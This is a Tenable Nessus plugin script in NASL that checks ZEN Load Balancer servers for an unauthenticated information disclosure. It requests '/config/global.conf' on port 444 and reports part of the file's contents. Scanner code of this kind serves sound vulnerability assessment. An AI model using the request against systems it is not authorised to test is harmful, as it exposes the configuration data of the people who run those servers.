#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(62367);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2015/09/24 23:21:23 $");

  script_bugtraq_id(55638);
  script_osvdb_id(85690);

  script_name(english:"ZEN Load Balancer global.conf Information Disclosure");
  script_summary(english:"Tries to read global.conf");

  script_set_attribute(attribute:"synopsis", value:
"A web application hosted on the remote web server is affected by an
information disclosure vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of ZEN Load Balancer hosted on the remote web server fails
to restrict access to its 'config/global.conf' file.  A remote,
unauthenticated attacker, by exploiting this flaw, could obtain
sensitive information about the application.");
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?660e9d24");
  script_set_attribute(attribute:"solution", value:"There is no solution at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2012/09/21");
  script_set_attribute(attribute:"plugin_publication_date", value:"2012/09/28");
  
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
  
  script_copyright(english:"This script is Copyright (C) 2012-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 444);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:444);

# Make sure the banner looks correct unless we're paranoid
if (report_paranoia < 2)
{
  server = http_server_header(port:port);
  if (isnull(server)) audit(AUDIT_WEB_BANNER_NOT, port);
  if ("mini_httpd" >!< server) audit(AUDIT_WRONG_WEB_SERVER, port, 'mini_httpd');
}

# Attempt to retrieve /config/global.conf
res = http_send_recv3(method:"GET", port:port, item:'/config/global.conf', exit_on_fail:TRUE);

if (
  '#::INI Global information' >< res[2] &&
  '#File configuration Zen Cluster' >< res[2] &&
  '#version ZEN' >< res[2]
)
{
  if (report_verbosity > 0)
  { 
    line_limit = 10;
    trailer = '';

    header = 
      'Nessus was able to exploit the issue to retrieve the contents of\n' +
      '\'/config/global.conf\' on the remote host using the following URL';

    if (report_verbosity > 1)
    {
      trailer = 
      'Here are its contents (limited to ' + line_limit + ' line ) :\n' +
      '\n' +
      crap(data:'-', length:30) + ' snip ' + crap(data:'-', length:30) + '\n' +
      beginning_of_response(resp:res[2], max_lines:line_limit) +
      crap(data:'-', length:30) + ' snip ' + crap(data:'-', length:30) + '\n';
    }
    report = get_vuln_report(items:'/config/global.conf', port:port, header:header, trailer:trailer);
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, 'ZEN Load Balancer', build_url(port:port, qs:'/'));
